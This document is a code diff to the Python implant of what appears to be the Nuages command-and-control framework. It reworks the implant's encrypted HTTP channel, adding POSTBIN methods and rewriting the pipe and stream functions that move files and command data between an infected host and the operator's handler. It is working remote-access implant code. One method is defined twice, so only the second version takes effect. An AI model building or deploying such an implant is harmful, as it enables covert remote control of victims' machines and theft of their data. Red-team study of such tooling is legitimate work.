@@ -66,7 +66,7 @@ class AESCipher(object):
         #enc = base64.b64decode(enc)
         iv = enc[:AES.block_size]
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
-        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+        return self._unpad(cipher.decrypt(enc[AES.block_size:]))
 
     def _pad(self, s):
         return self.pkcs7.encode(s)
@@ -78,11 +78,10 @@ class NuagesConnector:
     def __init__(self, connectionString, key):
         # The URL of our handler
         self.connectionString = connectionString
-        # The seed to generate our encryption key
+        # The seed to generate our encryption keys
         self.aes = AESCipher(key)
 
     def POST(self, url, data):
-        # The Json data is sent encrypted in the request body
         encrypted_data = self.aes.encrypt(bytes(data, 'utf-8'))
 
         # The target URL is sent as Base64 in the Authorization header
@@ -91,10 +90,52 @@ class NuagesConnector:
 
         r = requests.post(self.connectionString, encrypted_data, headers=headers)
         if(r.status_code != 200):
-            raise Exception(r.status_code)
+            raise Exception(r.status_code)            
+        if(len(r.content)>0):
+            # The result must be decrypted
+            return self.aes.decrypt(r.content).decode('utf-8')
+        return ''
+
+    def POSTBIN(self, pipe_id, data):
+        # The target URL is generated
+        url = "io/" + pipe_id
         
-        # The result must be decrypted
-        return self.aes.decrypt(r.content)
+        # The data is encrypted
+        encrypted_data = self.aes.encrypt(data)
+
+        # The target URL is sent as Base64 in the Authorization header
+        encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
+        
+        headers = {'Authorization': encrypted_url}
+
+        r = requests.post(self.connectionString, encrypted_data, headers=headers)
+        if(r.status_code != 200):
+            raise Exception(r.status_code)            
+        if(len(r.content)>0):
+            # The result must be decrypted
+            return self.aes.decrypt(r.content)
+        return ''
+
+    def POSTBIN(self, pipe_id, data, maxSize):
+        # The target URL is generated
+        url = "io/{}/{}".format(pipe_id, maxSize)
+        
+        # The data is encrypted
+        encrypted_data = self.aes.encrypt(data)
+
+        # The target URL is sent as Base64 in the Authorization header
+        encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
+        
+        headers = {'Authorization': encrypted_url}
+
+        r = requests.post(self.connectionString, encrypted_data, headers=headers)
+        if(r.status_code != 200):
+            raise Exception(r.status_code)            
+        if(len(r.content)>0):
+            # The result must be decrypted
+            return self.aes.decrypt(r.content)
+        return ''
+
 
 class NuagesImplant:
     def __init__(self, nuages, config):
@@ -147,48 +188,32 @@ class NuagesImplant:
         # The implant configuration is used
         buffersize = int(self.config["buffersize"])
         refreshrate = float(self.config["refreshrate"]) / 1000
-        body = {}
-        body["pipe_id"] = pipe_id
         # Until the whole file has been loaded from the pipe
         while (bytesRead < bytesWanted):
             # We dont want to read more from the pipe than the size of our buffer
-            body["maxSize"] = min(buffersize, bytesWanted - bytesRead)
-            response = json.loads(self.nuages.POST("io", json.dumps(body)))
-            if("out" in response):
-                # The output is encoded in Base64
-                buffer = base64.b64decode(response["out"])
-                bytesRead += len(buffer)
+            response = self.nuages.POSTBIN(pipe_id, b'', min(buffersize, bytesWanted - bytesRead))
+            if(len(response)>0):
+                bytesRead += len(response)
                 # We can write the bytes to the stream
-                stream.write(buffer)
+                stream.write(response)
                 time.sleep(refreshrate)
 
     def stream2pipe(self, pipe_id, stream):
         # The implant configuration is used
         buffersize = int(self.config["buffersize"])
         refreshrate = float(self.config["refreshrate"]) / 1000
-        body = {}
-        body["pipe_id"] = pipe_id
-        # We dont want to read anything from the pipe
-        body["maxSize"] = 0
         buffer = [1]
         # While we can buffer bytes fromt the file stream
         while (len(buffer) > 0):
             buffer = stream.read(buffersize)
-            # The bytes are encoded and sent to the stream
-            body["in"] = base64.b64encode(buffer).decode("ascii")
-            self.nuages.POST("io", json.dumps(body))
+            self.nuages.POSTBIN(pipe_id, buffer, 0)
             time.sleep(refreshrate)
     
     def pipe_read(self, pipe_id):
         buffersize = int(self.config["buffersize"])
-        body = {}
-        body["pipe_id"] = pipe_id
-        # We inform the server that we have a maximum buffer size
-        body["maxSize"] = buffersize
-        response = json.loads(self.nuages.POST("io", json.dumps(body)))
-        if("out" in response):
-            # We decode the output and return it as bytes
-            return base64.b64decode(response["out"])
+        response = self.nuages.POSTBIN(pipe_id, b'', buffersize)
+        if(len(response)>0):
+                return response
         else:
             return b''
 
@@ -201,22 +226,18 @@ class NuagesImplant:
         # We read from the pipe until we have read the amount we want
         while (len(buffer) < bytesWanted):
             # We dont want to read more than needed
-            body["maxSize"] = min(buffersize, bytesWanted - len(buffer))
-            response = json.loads(self.nuages.POST("io", json.dumps(body)))
-            if("out" in response):
+            maxSize = min(buffersize, bytesWanted - len(buffer))
+            response = self.nuages.POSTBIN(pipe_id, b'', maxSize)
+            if(len(response)>0):
                 # We append the read data to our buffer
-                buffer += base64.b64decode(response["out"])
+                buffer += response
                 time.sleep(refreshrate)
-            # We return the buffer
+        # We return the buffer
         return buffer
 
     def pipe_readwrite(self, pipe_id, data):
         buffersize = int(self.config["buffersize"])
         refreshrate = float(self.config["refreshrate"]) / 1000
-        body = {}
-        body["pipe_id"] = pipe_id
-        # We inform the server that we have a maximum buffer size
-        body["maxSize"] = buffersize
         buffer = b''
         sentBytes = 0
         l = len(data)
@@ -225,12 +246,12 @@ class NuagesImplant:
             # We cant send more than our buffer
             bytesToSend = min(buffersize, l - sentBytes)
             # The data is sent as base64
-            body["in"] = base64.b64encode(data[sentBytes:sentBytes + bytesToSend]).decode("ascii")
+            dataToSend = data[sentBytes:sentBytes + bytesToSend]
             sentBytes += bytesToSend
-            response = json.loads(self.nuages.POST("io", json.dumps(body)))
-            if("out" in response):
+            response = self.nuages.POSTBIN(pipe_id, dataToSend, buffersize)
+            if(len(response)>0):
                 # If there is data in the stream it is appended to our buffer
-                buffer += base64.b64decode(response["out"])
+                buffer += response
             time.sleep(refreshrate)
         # We return any data that we read
         return buffer
@@ -238,10 +259,6 @@ class NuagesImplant:
     def pipe_write(self, pipe_id, data):
         buffersize = int(self.config["buffersize"])
         refreshrate = float(self.config["refreshrate"]) / 1000
-        body = {}
-        body["pipe_id"] = pipe_id
-        # We dont want to read from the pipe
-        body["maxSize"] = 0
         sentBytes = 0
         l = len(data)
         # Until we have sent all the data we need to send
@@ -249,9 +266,9 @@ class NuagesImplant:
             # We cant send more than our buffer
             bytesToSend = min(buffersize, l - sentBytes)
             # The data is sent as base64
-            body["in"] = base64.b64encode(data[sentBytes:sentBytes + bytesToSend]).decode("ascii")
+            dataToSend = data[sentBytes:sentBytes + bytesToSend]
             sentBytes += bytesToSend
-            self.nuages.POST("io", json.dumps(body))
+            self.nuages.POSTBIN(pipe_id, dataToSend, 0)
             time.sleep(refreshrate)
 
     def jobResult(self, job_id, result, error):
@@ -618,7 +635,7 @@ class NuagesImplant:
                     pass
                 else:
                     pass
-
+                
 nuages = NuagesConnector("http://127.0.0.1:8888","password")
 config = {}
 config["sleep"] = "1"
